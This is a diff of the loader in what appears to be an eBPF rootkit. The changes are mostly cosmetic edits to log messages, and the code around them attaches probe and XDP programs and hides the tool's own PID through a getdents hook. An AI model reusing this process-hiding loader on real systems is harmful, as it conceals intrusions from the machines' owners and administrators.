@@ -211,6 +211,7 @@ int main(int argc, char **argv) {
   asciiheader();
   rootcheck(argc, argv);
   boopprintf("  -> Logs: cat /sys/kernel/tracing/trace_pipe\n");
+  boopprintf("  -> Obfuscating PID: %s\n", pid);
 
   int loaded, err;
   struct bpf_object *bpobj;
@@ -237,14 +238,14 @@ int main(int argc, char **argv) {
       boopprintf("Unable to load eBPF object: %s\n", cfg.pr0bebooppath);
       return 1;
     }
-    boopprintf("  -> eBPF Probe loaded: %s\n", cfg.pr0bebooppath);
+    boopprintf("  -> -> eBPF Probe loaded: %s\n", cfg.pr0bebooppath);
     bpf_object__next_map(xdpobj, NULL);
     bpf_object__for_each_program(xdpprog, xdpobj) {
-      boopprintf("  -> eBPF Program Address: %p\n", xdpprog);
+      boopprintf("  -> -> eBPF Program Address: %p\n", xdpprog);
       const char *progname = bpf_program__name(xdpprog);
-      boopprintf("  -> eBPF Program Name: %s\n", progname);
+      boopprintf("  -> -> eBPF Program Name: %s\n", progname);
       const char *progsecname = bpf_program__section_name(xdpprog);
-      boopprintf("  -> eBPF Program Section Name: %s\n", progsecname);
+      boopprintf("  -> -> eBPF Program Section Name: %s\n", progsecname);
       struct bpf_link *link = bpf_program__attach(xdpprog);
       if (!link) {
         boopprintf("Unable to link eBPF program: %s\n", xdpprog);
@@ -269,7 +270,6 @@ int main(int argc, char **argv) {
     //       will manage ensuring we are executing this program without sudo
     env.pid_to_hide = getpid();
     sprintf(pid, "%d", env.pid_to_hide);
-    boopprintf("  -> Obfuscating PID: %s\n", pid);
     strncpy(sfobj->rodata->pid_to_hide, pid,
             sizeof(sfobj->rodata->pid_to_hide));
 
@@ -282,7 +282,7 @@ int main(int argc, char **argv) {
       boopprintf("Permission denied.\n");
       return 1;
     }
-    boopprintf("  -> eBPF Probe loaded: %s\n", cfg.pr0besafepath);
+    boopprintf("  -> -> eBPF Probe loaded: %s\n", cfg.pr0besafepath);
     int index = PROG_01;
     int prog_fd = bpf_program__fd(sfobj->progs.handle_getdents_exit);
     int ret = bpf_map_update_elem(bpf_map__fd(sfobj->maps.map_prog_array),
@@ -332,14 +332,14 @@ int main(int argc, char **argv) {
       boopprintf("Unable to load eBPF object: %s\n", cfg.pr0bebooppath);
       return 1;
     }
-    boopprintf("  -> eBPF Probe loaded: %s\n", cfg.pr0bebooppath);
+    boopprintf("  -> -> eBPF Probe loaded: %s\n", cfg.pr0bebooppath);
     bpf_object__next_map(bpobj, NULL);
     bpf_object__for_each_program(program, bpobj) {
-      boopprintf("  -> eBPF Program Address: %p\n", program);
+      boopprintf("  -> -> eBPF Program Address: %p\n", program);
       const char *progname = bpf_program__name(program);
-      boopprintf("  -> eBPF Program Name: %s\n", progname);
+      boopprintf("  -> -> eBPF Program Name: %s\n", progname);
       const char *progsecname = bpf_program__section_name(program);
-      boopprintf("  -> eBPF Program Section Name: %s\n", progsecname);
+      boopprintf("  -> -> eBPF Program Section Name: %s\n", progsecname);
       struct bpf_link *link = bpf_program__attach(program);
       if (!link) {
         boopprintf("Unable to link eBPF program: %s\n", progname);
@@ -360,9 +360,9 @@ int main(int argc, char **argv) {
   // map from the probe.
   struct bpf_map *bpmap = bpf_object__next_map(bpobj, NULL);
   const char *mapname = bpf_map__name(bpmap);
-  boopprintf("  -> eBPF Map Name: %s\n", mapname);
+  boopprintf("  -> -> eBPF Map Name: %s\n", mapname);
   int fd = bpf_map__fd(bpmap);
-  boopprintf("  -> eBPF Program Linked!\n");
+  boopprintf("  -> -> eBPF Program Linked!\n");
 
 
   // Logs
